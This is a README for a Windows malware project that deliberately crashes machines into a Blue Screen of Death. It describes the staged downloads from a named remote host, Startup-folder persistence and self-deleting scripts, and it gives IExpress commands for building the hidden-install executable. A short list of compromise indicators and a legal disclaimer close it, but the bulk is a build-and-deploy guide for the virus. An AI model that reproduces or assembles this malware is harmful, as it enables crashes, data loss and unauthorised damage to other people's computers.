# HUULA Virus - BSOD Payload

A self-extracting executable that downloads and executes BSOD (Blue Screen of Death) payloads from a remote server, causing Windows to crash.

---

## Overview

HUULA is a virus that induces system crashes by pulling and executing malicious batch and VBScript payloads. When executed, it establishes persistence, downloads additional stages, and triggers a fatal system error resulting in a BSOD.

---

## How It Works

### Attack Flow

1. **Entry Point** (`RUN.bat`)
   - Downloads `code.html` → saves as `bsod.bat`
   - Copies to Startup folder for persistence
   - Downloads `code.bat` and executes it
   - Self-deletes after execution

2. **Stage 2** (`code.bat`)
   - Downloads multiple payloads to `%TEMP%`:
     - `check.vbs` (from `code2.html`)
     - `checker.bat` (from `code6.html`)
     - `dan.bat` (from `code4.html`)
   - Executes `check.vbs`
   - Self-deletes

3. **VBScript Trigger** (`check.vbs`)
   - Uses `WScript` to execute the downloaded payloads
   - Runs batch files silently

4. **BSOD Payload**
   - Executes commands that force a critical system crash
   - Triggers Windows Blue Screen of Death

5. **Cleanup**
   - All scripts self-destruct after execution
   - Minimal forensic footprint

---

## Files

| File | Role |
|------|------|
| `RUN.bat` | Entry point, persistence installer |
| `chaos.bat` | Secondary downloader with self-destruct |
| `code.bat` | Multi-stage payload fetcher |
| `check.vbs` | VBScript execution trigger |
| `checker.bat` | File existence verifier |
| `ieexpress.SED` | IExpress configuration |
| `HUULA - VIRUS.EXE` | Compiled self-extracting executable |

---

## Building the EXE

### Method 1: IExpress GUI

```cmd
iexpress
```

1. Select "Create new Self Extraction Directive"
2. Purpose: Install application
3. Add all `.bat` and `.vbs` files
4. Install program: `RUN.bat`
5. Hide install window
6. Output: `HUULA.EXE`

### Method 2: Command Line

```cmd
iexpress /N /M "ieexpress.SED"
```

The `ieexpress.SED` file is pre-configured with the correct settings and file list.

---

## Remote Server Dependencies

The virus requires a web server hosting these files:

```
https://h19qjj92.000webhostapp.com/
├── code.html   → bsod.bat
├── code2.html  → check.vbs
├── code3.html  → code.bat
├── code4.html  → dan.bat
├── code5.html  → RUN.bat
└── code6.html  → checker.bat
```

All downloads use `curl.exe` with `--silent` flag.

---

## Persistence

Copies `bsod.bat` to Windows Startup:

```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
```

Executes on user login.

---

## Detection & Analysis

### Indicators of Compromise (IoCs)

- Network: HTTP GET requests to `h19qjj92.000webhostapp.com`
- File system: Unexpected `.bat` and `.vbs` files in `%TEMP%`
- Registry/Startup: `bsod.bat` in Startup folder
- Behavior: System crashes into BSOD
- Process: `cmd.exe`, `wscript.exe`, `curl.exe` execution chains

### Forensic Notes

- Scripts delete themselves post-execution
- Limited disk footprint
- No registry modifications besides Startup copy
- Network traffic only to hardcoded URL

---

## Legal Warning

**For educational and authorized security testing only.**

Deploying this against systems without explicit permission is illegal. Use only in isolated lab environments with proper authorization. The developer assumes no responsibility for misuse.

---

## Disclaimer

This tool demonstrates BSOD attack techniques for research purposes. Unauthorized use violates computer fraud laws and can cause data loss, system damage, and legal consequences.
